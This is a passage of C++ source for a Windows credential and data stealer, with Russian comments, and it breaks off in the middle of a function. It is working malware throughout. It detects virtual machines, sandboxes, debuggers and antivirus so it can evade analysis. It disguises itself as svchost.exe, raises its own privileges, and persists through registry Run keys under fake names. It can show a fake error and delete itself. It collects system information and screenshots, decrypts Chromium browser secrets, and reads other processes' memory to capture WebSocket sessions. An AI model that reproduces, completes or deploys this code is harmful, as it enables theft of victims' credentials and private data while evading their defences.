#include <windows.h>
#include <ntstatus.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <regex>
#include <gdiplus.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <wininet.h>
#include <psapi.h>
#include <shlobj.h>
#include <sqlite3.h>
#include <wincrypt.h>
#include <urlmon.h>
#include <filesystem>
#include <random>
#include <time.h>
#include <zip.h>
#include <QApplication>
#include <QMainWindow>
#include <QThread>
#include <QNetworkAccessManager>
#include <QNetworkRequest>
#include <QNetworkReply>
#include <QHttpMultiPart>
#include <QFile>
#include <QFileDialog>
#include <QMessageBox>
#include <QSettings>
#include <mutex>
#include <thread>
#include <memoryapi.h>
#include <bcrypt.h>

#include "mainwindow.h"
#include "build_key.h"
#include "polymorphic_code.h"
#include "junk_code.h"
#include "stealerworker.h"

// Определение NT_SUCCESS, если он отсутствует
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Переопределение типов для совместимости
typedef enum _THREADINFOCLASS {
    ThreadBasicInformation = 0,
    ThreadQuerySetWin32StartAddress = 9
} THREADINFOCLASS;

typedef struct _THREAD_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID TebBaseAddress;
    ULONG_PTR ClientId;
    ULONG_PTR AffinityMask;
    LONG Priority;
    LONG BasePriority;
} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;

// Глобальные переменные
std::mutex g_mutex;
MainWindow* g_mainWindow = nullptr;
Gdiplus::GdiplusStartupInput gdiplusStartupInput;
ULONG_PTR gdiplusToken;

// Функция для логирования с потокобезопасностью
void Log(const QString& message) {
    std::lock_guard<std::mutex> lock(g_mutex);
    if (g_mainWindow) {
        g_mainWindow->emitLog(message);
    }
    std::cout << message.toStdString() << std::endl;
}

// Генерация IV с использованием криптографически безопасного RNG
std::array<unsigned char, 16> GenerateIV() {
    std::array<unsigned char, 16> iv;
    BCRYPT_ALG_HANDLE hRng;
    NTSTATUS status = BCryptOpenAlgorithmProvider(&hRng, BCRYPT_RNG_ALGORITHM, nullptr, 0);
    if (BCRYPT_SUCCESS(status)) {
        status = BCryptGenRandom(hRng, iv.data(), iv.size(), 0);
        BCryptCloseAlgorithmProvider(hRng, 0);
        if (!BCRYPT_SUCCESS(status)) {
            Log("Ошибка генерации IV: " + QString::number(status));
        }
    } else {
        Log("Ошибка открытия провайдера RNG: " + QString::number(status));
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        for (auto& byte : iv) {
            byte = static_cast<unsigned char>(dis(gen));
        }
    }
    return iv;
}

// Получение ключа из строки с дополнением до нужной длины
std::array<unsigned char, 16> GetStaticEncryptionKey(const std::string& key) {
    std::array<unsigned char, 16> result = {};
    if (key.empty()) return result;
    size_t len = std::min(key.size(), result.size());
    std::copy(key.begin(), key.begin() + len, result.begin());
    if (len < result.size()) {
        for (size_t i = len; i < result.size(); ++i) {
            result[i] = result[i % len];
        }
    }
    return result;
}

// Шифрование данных с улучшенной обработкой ошибок
std::string EncryptData(const std::string& data, const std::string& key1, const std::string& key2, const std::string& salt) {
    if (data.empty() || key1.empty() || key2.empty() || salt.empty()) {
        Log("Параметры шифрования не могут быть пустыми");
        return "";
    }

    std::array<unsigned char, 16> encryptionKey1 = GetStaticEncryptionKey(key1);
    std::array<unsigned char, 16> encryptionKey2 = GetStaticEncryptionKey(key2);
    std::array<unsigned char, 16> iv = GenerateIV();

    std::vector<unsigned char> combinedKey(32);
    std::copy(encryptionKey1.begin(), encryptionKey1.end(), combinedKey.begin());
    std::copy(encryptionKey2.begin(), encryptionKey2.end(), combinedKey.begin() + 16);

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        Log("Ошибка открытия провайдера алгоритма AES: " + QString::number(status));
        return "";
    }

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        Log("Ошибка установки режима цепочки: " + QString::number(status));
        return "";
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, combinedKey.data(), combinedKey.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        Log("Ошибка генерации симметричного ключа: " + QString::number(status));
        return "";
    }

    DWORD cbData = 0, cbResult = 0;
    status = BCryptEncrypt(hKey, (PUCHAR)data.data(), data.size(), nullptr, iv.data(), iv.size(), nullptr, 0, &cbData, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        Log("Ошибка расчёта размера зашифрованных данных: " + QString::number(status));
        return "";
    }

    std::vector<BYTE> encryptedData(cbData);
    status = BCryptEncrypt(hKey, (PUCHAR)data.data(), data.size(), nullptr, iv.data(), iv.size(), encryptedData.data(), cbData, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        Log("Ошибка шифрования данных: " + QString::number(status));
        return "";
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    std::vector<BYTE> finalData(iv.size() + cbResult);
    std::copy(iv.begin(), iv.end(), finalData.begin());
    std::copy(encryptedData.begin(), encryptedData.begin() + cbResult, finalData.begin() + iv.size());

    DWORD base64Size = 0;
    if (!CryptBinaryToStringA(finalData.data(), finalData.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &base64Size)) {
        Log("Ошибка расчёта размера Base64: " + QString::number(GetLastError()));
        return "";
    }
    std::vector<char> base64Data(base64Size);
    if (!CryptBinaryToStringA(finalData.data(), finalData.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64Data.data(), &base64Size)) {
        Log("Ошибка преобразования в Base64: " + QString::number(GetLastError()));
        return "";
    }

    return std::string(base64Data.data(), base64Size - 1);
}

// Дешифрование данных с исправлением ошибок
std::string DecryptData(const std::string& encryptedData) {
    if (encryptedData.empty() || !g_mainWindow) {
        Log("Зашифрованные данные или MainWindow отсутствуют");
        return "";
    }

    std::string key1 = g_mainWindow->encryptionKey1;
    std::string key2 = g_mainWindow->encryptionKey2;
    std::string salt = g_mainWindow->encryptionSalt;

    if (key1.empty() || key2.empty() || salt.empty()) {
        Log("Ключи дешифрования или соль пусты");
        return "";
    }

    DWORD binarySize = 0;
    if (!CryptStringToBinaryA(encryptedData.c_str(), encryptedData.size(), CRYPT_STRING_BASE64, nullptr, &binarySize, nullptr, nullptr)) {
        Log("Ошибка расчёта размера бинарных данных для дешифрования: " + QString::number(GetLastError()));
        return "";
    }
    std::vector<BYTE> binaryData(binarySize);
    if (!CryptStringToBinaryA(encryptedData.c_str(), encryptedData.size(), CRYPT_STRING_BASE64, binaryData.data(), &binarySize, nullptr, nullptr)) {
        Log("Ошибка преобразования Base64 в бинарные данные: " + QString::number(GetLastError()));
        return "";
    }

    if (binarySize < 16) {
        Log("Зашифрованные данные слишком короткие для IV");
        return "";
    }
    std::array<unsigned char, 16> iv;
    std::copy(binaryData.begin(), binaryData.begin() + 16, iv.begin());

    std::vector<BYTE> encryptedContent(binaryData.begin() + 16, binaryData.end());
    DWORD encryptedSize = binarySize - 16;

    std::array<unsigned char, 16> encryptionKey1 = GetStaticEncryptionKey(key1);
    std::array<unsigned char, 16> encryptionKey2 = GetStaticEncryptionKey(key2);

    std::vector<unsigned char> combinedKey(32);
    std::copy(encryptionKey1.begin(), encryptionKey1.end(), combinedKey.begin());
    std::copy(encryptionKey2.begin(), encryptionKey2.end(), combinedKey.begin() + 16);

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        Log("Ошибка открытия провайдера AES для дешифрования: " + QString::number(status));
        return "";
    }

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        Log("Ошибка установки режима цепочки для дешифрования: " + QString::number(status));
        return "";
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, combinedKey.data(), combinedKey.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        Log("Ошибка генерации симметричного ключа для дешифрования: " + QString::number(status));
        return "";
    }

    DWORD cbData = 0, cbResult = 0;
    status = BCryptDecrypt(hKey, encryptedContent.data(), encryptedSize, nullptr, iv.data(), iv.size(), nullptr, 0, &cbData, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        Log("Ошибка расчёта размера дешифрованных данных: " + QString::number(status));
        return "";
    }

    std::vector<BYTE> decryptedData(cbData);
    status = BCryptDecrypt(hKey, encryptedContent.data(), encryptedSize, nullptr, iv.data(), iv.size(), decryptedData.data(), cbData, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        Log("Ошибка дешифрования данных: " + QString::number(status));
        return "";
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return std::string(reinterpret_cast<char*>(decryptedData.data()), cbResult);
}

// Проверка на виртуальную машину с расширенной логикой
bool CheckVirtualEnvironment() {
    bool isVM = false;

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char value[256] = {0};
        DWORD size = sizeof(value);
        if (RegQueryValueExA(hKey, "Identifier", nullptr, nullptr, (LPBYTE)value, &size) == ERROR_SUCCESS) {
            std::string identifier(value);
            std::vector<std::string> vmSignatures = {"VBOX", "VMWARE", "QEMU", "VIRTUAL", "KVM", "XEN"};
            for (const auto& sig : vmSignatures) {
                if (identifier.find(sig) != std::string::npos) {
                    Log("Обнаружена ВМ через идентификатор SCSI: " + QString::fromStdString(identifier));
                    isVM = true;
                    break;
                }
            }
        }
        RegCloseKey(hKey);
    }

    std::vector<std::string> sandboxDlls = {"SbieDll.dll", "dbghelp.dll", "snxhk.dll"};
    for (const auto& dll : sandboxDlls) {
        if (GetModuleHandleA(dll.c_str())) {
            Log("Обнаружен песочница или отладчик (" + QString::fromStdString(dll) + ")");
            isVM = true;
        }
    }

    SYSTEM_INFO sysInfo{};
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors <= 2) {
        Log("Обнаружено малое количество процессоров: " + QString::number(sysInfo.dwNumberOfProcessors));
        isVM = true;
    }

    MEMORYSTATUSEX memStatus{};
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {
        Log("Обнаружен малый объём памяти: " + QString::number(memStatus.ullTotalPhys / (1024 * 1024)) + " МБ");
        isVM = true;
    }

    LARGE_INTEGER freq{}, start{}, end{};
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    for (volatile int i = 0; i < 100000; i++);
    QueryPerformanceCounter(&end);
    double elapsed = (end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
    if (elapsed > 50) {
        Log("Обнаружено подозрительное время выполнения: " + QString::number(elapsed) + " мс");
        isVM = true;
    }

    ULONG bufferSize = 15000;
    std::vector<char> buffer(bufferSize);
    PIP_ADAPTER_INFO adapterInfo = reinterpret_cast<PIP_ADAPTER_INFO>(buffer.data());
    if (GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
        for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter; adapter = adapter->Next) {
            std::string mac;
            for (unsigned int i = 0; i < adapter->AddressLength; i++) {
                char macByte[3];
                sprintf_s(macByte, "%02X", adapter->Address[i]);
                mac += macByte;
                if (i < adapter->AddressLength - 1) mac += "-";
            }
            std::vector<std::string> vmMacPrefixes = {"00-50-56", "00-0C-29", "00-1C-14", "00-05-69", "08-00-27"};
            for (const auto& prefix : vmMacPrefixes) {
                if (mac.find(prefix) != std::string::npos) {
                    Log("Обнаружен MAC-адрес ВМ: " + QString::fromStdString(mac));
                    isVM = true;
                    break;
                }
            }
        }
    }

    std::vector<std::string> vmDrivers = {"VBoxDrv.sys", "vmci.sys", "vmhgfs.sys", "vmmemctl.sys", "prl_fs.sys"};
    for (const auto& driver : vmDrivers) {
        std::string driverPath = "C:\\Windows\\System32\\drivers\\" + driver;
        if (std::filesystem::exists(driverPath)) {
            Log("Обнаружен драйвер ВМ: " + QString::fromStdString(driver));
            isVM = true;
        }
    }

    return isVM;
}

// Проверка на отладчик или антивирус с улучшенной логикой
bool CheckDebuggerOrAntivirus() {
    if (IsDebuggerPresent()) {
        Log("Обнаружен отладчик через IsDebuggerPresent");
        return true;
    }

    typedef NTSTATUS(NTAPI *pNtQueryInformationThread)(HANDLE, THREADINFOCLASS, PVOID, ULONG, PULONG);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        Log("Ошибка загрузки ntdll.dll для NtQueryInformationThread");
        return false;
    }

    pNtQueryInformationThread NtQueryInformationThread = reinterpret_cast<pNtQueryInformationThread>(
        GetProcAddress(hNtdll, "NtQueryInformationThread"));
    if (NtQueryInformationThread) {
        THREAD_BASIC_INFORMATION tbi{};
        NTSTATUS status = NtQueryInformationThread(GetCurrentThread(), ThreadBasicInformation, &tbi, sizeof(tbi), nullptr);
        if (NT_SUCCESS(status) && tbi.TebBaseAddress) {
            DWORD debugPort = 0;
            status = NtQueryInformationThread(GetCurrentThread(), ThreadQuerySetWin32StartAddress, &debugPort, sizeof(debugPort), nullptr);
            if (NT_SUCCESS(status) && debugPort != 0) {
                Log("Обнаружен отладчик через NtQueryInformationThread");
                return true;
            }
        }
    }

    std::vector<std::string> avProcesses = {
        "avp.exe", "MsMpEng.exe", "avgui.exe", "egui.exe", "McTray.exe",
        "norton.exe", "avastui.exe", "kav.exe", "wireshark.exe", "ollydbg.exe",
        "procmon.exe", "idaq.exe", "x64dbg.exe"
    };
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        Log("Ошибка создания снимка процессов для проверки антивируса");
        return false;
    }

    PROCESSENTRY32W pe32{};
    pe32.dwSize = sizeof(pe32);
    bool avDetected = false;
    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            std::wstring processName(pe32.szExeFile);
            for (const auto& av : avProcesses) {
                std::wstring wAv(av.begin(), av.end());
                if (_wcsicmp(processName.c_str(), wAv.c_str()) == 0) {
                    Log("Обнаружен антивирус или инструмент анализа: " + QString::fromStdWString(processName));
                    avDetected = true;
                    break;
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32) && !avDetected);
    }
    CloseHandle(hProcessSnap);
    return avDetected;
}

// Антианализ с дополнительными проверками
bool MainWindow::AntiAnalysis() {
    if (!config.antiVM) return false;

    if (CheckVirtualEnvironment()) {
        Log("Обнаружена виртуальная машина, завершение работы");
        return true;
    }

    if (CheckDebuggerOrAntivirus()) {
        Log("Обнаружен отладчик или антивирус, завершение работы");
        return true;
    }

    LARGE_INTEGER freq{}, start{}, end{};
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    for (volatile int i = 0; i < 1000000; i++);
    QueryPerformanceCounter(&end);
    double elapsed = (end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
    if (elapsed > 100) {
        Log("Обнаружено подозрительное время выполнения: " + QString::number(elapsed) + " мс, завершение работы");
        return true;
    }

    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te32{};
        te32.dwSize = sizeof(te32);
        int threadCount = 0;
        if (Thread32First(hThreadSnap, &te32)) {
            do {
                if (te32.th32OwnerProcessID == GetCurrentProcessId()) threadCount++;
            } while (Thread32Next(hThreadSnap, &te32));
        }
        CloseHandle(hThreadSnap);
        if (threadCount > 50) {
            Log("Обнаружено слишком много потоков: " + QString::number(threadCount) + ", завершение работы");
            return true;
        }
    }

    char processName[MAX_PATH] = {0};
    GetModuleFileNameA(nullptr, processName, MAX_PATH);
    std::string procName = std::filesystem::path(processName).filename().string();
    std::vector<std::string> suspiciousNames = {"analyzer", "sandbox", "debug", "trace"};
    for (const auto& name : suspiciousNames) {
        if (procName.find(name) != std::string::npos) {
            Log("Обнаружено подозрительное имя процесса: " + QString::fromStdString(procName) + ", завершение работы");
            return true;
        }
    }

    return false;
}

// Маскировка процесса с улучшенной совместимостью
void MaskProcess() {
    HANDLE hProcess = GetCurrentProcess();
    SetPriorityClass(hProcess, HIGH_PRIORITY_CLASS);

    wchar_t systemPath[MAX_PATH] = {0};
    if (GetSystemDirectoryW(systemPath, MAX_PATH)) {
        wcscat_s(systemPath, L"\\svchost.exe");
        SetFileAttributesW(systemPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
    } else {
        Log("Ошибка получения системной директории для маскировки процесса");
    }

    typedef NTSTATUS(NTAPI *pNtSetInformationProcess)(HANDLE, DWORD, PVOID, ULONG);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        pNtSetInformationProcess NtSetInformationProcess = reinterpret_cast<pNtSetInformationProcess>(
            GetProcAddress(hNtdll, "NtSetInformationProcess"));
        if (NtSetInformationProcess) {
            wchar_t fakeName[] = L"svchost.exe";
            NTSTATUS status = NtSetInformationProcess(hProcess, 0x1C, fakeName, sizeof(fakeName));
            if (NT_SUCCESS(status)) {
                Log("Процесс замаскирован под svchost.exe");
            } else {
                Log("Ошибка маскировки процесса: " + QString::number(status));
            }
        }
    }
}

// Повышение привилегий и скрытие
void MainWindow::Stealth() {
    if (!config.silent) return;

    char path[MAX_PATH] = {0};
    GetModuleFileNameA(nullptr, path, MAX_PATH);
    SetFileAttributesA(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    MaskProcess();

    HANDLE hToken = nullptr;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        TOKEN_PRIVILEGES tp{};
        tp.PrivilegeCount = 1;
        if (LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &tp.Privileges[0].Luid)) {
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr) && GetLastError() == ERROR_SUCCESS) {
                Log("Привилегии повышены");
            } else {
                Log("Ошибка повышения привилегий: " + QString::number(GetLastError()));
            }
        }
        CloseHandle(hToken);
    } else {
        Log("Ошибка открытия токена процесса: " + QString::number(GetLastError()));
    }
}

// Добавление в автозапуск
void AddToStartup() {
    if (!g_mainWindow || !g_mainWindow->config.autoStart) return;

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH] = {0};
        GetModuleFileNameA(nullptr, path, MAX_PATH);
        if (RegSetValueExA(hKey, "SystemUpdate", 0, REG_SZ, (BYTE*)path, strlen(path) + 1) == ERROR_SUCCESS) {
            Log("Добавлено в автозапуск (HKEY_CURRENT_USER)");
        } else {
            Log("Ошибка установки значения реестра для автозапуска: " + QString::number(GetLastError()));
        }
        RegCloseKey(hKey);
    } else {
        Log("Ошибка открытия ключа реестра для автозапуска: " + QString::number(GetLastError()));
    }
}

// Обеспечение персистентности
void MainWindow::Persist() {
    if (!config.persist) return;

    AddToStartup();
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
        char path[MAX_PATH] = {0};
        GetModuleFileNameA(nullptr, path, MAX_PATH);
        if (RegSetValueExA(hKey, "SystemService", 0, REG_SZ, (BYTE*)path, strlen(path) + 1) == ERROR_SUCCESS) {
            Log("Установлена персистентность в HKEY_LOCAL_MACHINE");
        } else {
            Log("Ошибка установки значения в HKEY_LOCAL_MACHINE: " + QString::number(GetLastError()));
        }
        RegCloseKey(hKey);
    } else {
        Log("Ошибка создания ключа в HKEY_LOCAL_MACHINE: " + QString::number(GetLastError()));
    }
}

// Отображение фейковой ошибки
void MainWindow::FakeError() {
    if (!config.fakeError) return;

    MessageBoxA(nullptr, "Системная ошибка: Критический процесс прекратил работу.", "Системная ошибка", MB_ICONERROR | MB_OK);
    Log("Отображена фейковая ошибка");
}

// Самоуничтожение с улучшенной надежностью
void MainWindow::SelfDestruct() {
    if (!config.selfDestruct) return;

    char path[MAX_PATH] = {0};
    GetModuleFileNameA(nullptr, path, MAX_PATH);
    std::string batchFile = std::filesystem::temp_directory_path().string() + "\\self_destruct_" + std::to_string(GetTickCount64()) + ".bat";
    std::ofstream bat(batchFile);
    if (bat.is_open()) {
        bat << "@echo off\n";
        bat << "timeout /t 2 /nobreak >nul\n";
        bat << "del /f /q \"" << path << "\"\n";
        bat << "del /f /q \"%~f0\"\n";
        bat.close();

        if (ShellExecuteA(nullptr, "open", batchFile.c_str(), nullptr, nullptr, SW_HIDE) > (HINSTANCE)32) {
            Log("Инициировано самоуничтожение");
            ExitProcess(0);
        } else {
            Log("Ошибка выполнения бат-файла для самоуничтожения: " + QString::number(GetLastError()));
        }
    } else {
        Log("Ошибка создания бат-файла для самоуничтожения");
    }
}

// Получение версии ОС через RtlGetVersion
typedef NTSTATUS(WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
bool GetOSVersion(RTL_OSVERSIONINFOW& osInfo) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return false;

    RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
    if (!RtlGetVersion) return false;

    osInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);
    return RtlGetVersion(&osInfo) == 0;
}

// Получение системной информации с улучшенной детализацией
std::string GetCustomSystemInfo() {
    if (!g_mainWindow || !g_mainWindow->config.systemInfo) return "";

    std::ostringstream result;

    char username[UNLEN + 1] = {0};
    DWORD usernameLen = sizeof(username);
    if (GetUserNameA(username, &usernameLen)) {
        result << "Имя пользователя: " << username << "\n";
    } else {
        result << "Имя пользователя: Неизвестно\n";
        Log("Ошибка получения имени пользователя: " + QString::number(GetLastError()));
    }

    char computerName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD computerNameLen = sizeof(computerName);
    if (GetComputerNameA(computerName, &computerNameLen)) {
        result << "Имя компьютера: " << computerName << "\n";
    } else {
        result << "Имя компьютера: Неизвестно\n";
        Log("Ошибка получения имени компьютера: " + QString::number(GetLastError()));
    }

    SYSTEM_INFO sysInfo{};
    GetSystemInfo(&sysInfo);
    result << "Архитектура процессора: " << sysInfo.wProcessorArchitecture << "\n";
    result << "Количество процессоров: " << sysInfo.dwNumberOfProcessors << "\n";

    MEMORYSTATUSEX memInfo{};
    memInfo.dwLength = sizeof(memInfo);
    if (GlobalMemoryStatusEx(&memInfo)) {
        result << "Общий объём физической памяти: " << (memInfo.ullTotalPhys / (1024 * 1024)) << " МБ\n";
        result << "Доступная физическая память: " << (memInfo.ullAvailPhys / (1024 * 1024)) << " МБ\n";
    } else {
        result << "Информация о памяти: Неизвестно\n";
        Log("Ошибка получения информации о памяти: " + QString::number(GetLastError()));
    }

    RTL_OSVERSIONINFOW osInfo{};
    if (GetOSVersion(osInfo)) {
        result << "Версия ОС: " << osInfo.dwMajorVersion << "." << osInfo.dwMinorVersion << "\n";
        result << "Номер сборки: " << osInfo.dwBuildNumber << "\n";
        if (osInfo.szCSDVersion[0]) {
            result << "Сервис-пак: " << std::wstring(osInfo.szCSDVersion) << "\n";
        }
    } else {
        result << "Информация об ОС: Неизвестно\n";
        Log("Ошибка получения версии ОС");
    }

    ULONG bufferSize = 15000;
    std::vector<char> buffer(bufferSize);
    PIP_ADAPTER_INFO adapterInfo = reinterpret_cast<PIP_ADAPTER_INFO>(buffer.data());
    if (GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
        for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter; adapter = adapter->Next) {
            result << "Имя адаптера: " << adapter->AdapterName << "\n";
            result << "Описание: " << adapter->Description << "\n";
            result << "MAC-адрес: ";
            for (unsigned int i = 0; i < adapter->AddressLength; i++) {
                char mac[3];
                sprintf_s(mac, "%02X", adapter->Address[i]);
                result << mac;
                if (i < adapter->AddressLength - 1) result << "-";
            }
            result << "\nIP-адрес: " << adapter->IpAddressList.IpAddress.String << "\n";
        }
    } else {
        result << "Сетевая информация: Неизвестно\n";
        Log("Ошибка получения информации о сетевых адаптерах: " + QString::number(GetLastError()));
    }

    return result.str();
}

// Создание скриншота с освобождением ресурсов
std::string MainWindow::TakeScreenshot(const std::string& dir) {
    if (!config.screenshot) return "";

    HDC hScreenDC = GetDC(nullptr);
    if (!hScreenDC) {
        Log("Ошибка получения контекста экрана");
        return "";
    }

    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    if (!hMemoryDC) {
        ReleaseDC(nullptr, hScreenDC);
        Log("Ошибка создания контекста памяти");
        return "";
    }

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    if (!hBitmap) {
        DeleteDC(hMemoryDC);
        ReleaseDC(nullptr, hScreenDC);
        Log("Ошибка создания битмапа");
        return "";
    }

    HGDIOBJ oldBitmap = SelectObject(hMemoryDC, hBitmap);
    if (!BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY)) {
        SelectObject(hMemoryDC, oldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(nullptr, hScreenDC);
        Log("Ошибка захвата экрана: " + QString::number(GetLastError()));
        return "";
    }

    Gdiplus::Bitmap bitmap(hBitmap, nullptr);
    CLSID clsid;
    if (FAILED(CLSIDFromString(L"{557cf401-1a04-11d3-9a73-0000f81ef32e}", &clsid))) {
        SelectObject(hMemoryDC, oldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(nullptr, hScreenDC);
        Log("Ошибка получения CLSID для JPEG");
        return "";
    }

    std::string screenshotName = dir + "\\screenshot_" + std::to_string(GetTickCount64()) + ".jpg";
    std::wstring screenshotNameW(screenshotName.begin(), screenshotName.end());
    if (FAILED(bitmap.Save(screenshotNameW.c_str(), &clsid, nullptr))) {
        screenshotName.clear();
        Log("Ошибка сохранения скриншота: " + QString::number(GetLastError()));
    } else {
        Log("Скриншот сохранён: " + QString::fromStdString(screenshotName));
    }

    SelectObject(hMemoryDC, oldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(nullptr, hScreenDC);
    return screenshotName;
}

// Дешифрование данных Chromium с проверкой
std::string DecryptChromiumData(DATA_BLOB& encryptedData) {
    DATA_BLOB decryptedData{};
    if (encryptedData.cbData == 0 || !encryptedData.pbData) {
        Log("Недействительные зашифрованные данные Chromium");
        return "";
    }
    if (CryptUnprotectData(&encryptedData, nullptr, nullptr, nullptr, nullptr, 0, &decryptedData)) {
        std::string result((char*)decryptedData.pbData, decryptedData.cbData);
        LocalFree(decryptedData.pbData);
        return result;
    }
    Log("Ошибка дешифрования данных Chromium: " + QString::number(GetLastError()));
    return "";
}

// Захват WebSocket сессий с улучшенной фильтрацией
std::string CaptureWebSocketSessions(const std::string& processName) {
    std::string result;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        Log("Ошибка создания снимка процессов для захвата WebSocket");
        return result;
    }

    PROCESSENTRY32W pe32{};
    pe32.dwSize = sizeof(pe32);
    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, std::wstring(processName.begin(), processName.end()).c_str()) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    char buffer[4096] = {0};
                    SIZE_T bytesRead = 0;
                    MEMORY_BASIC_INFORMATION mbi{};
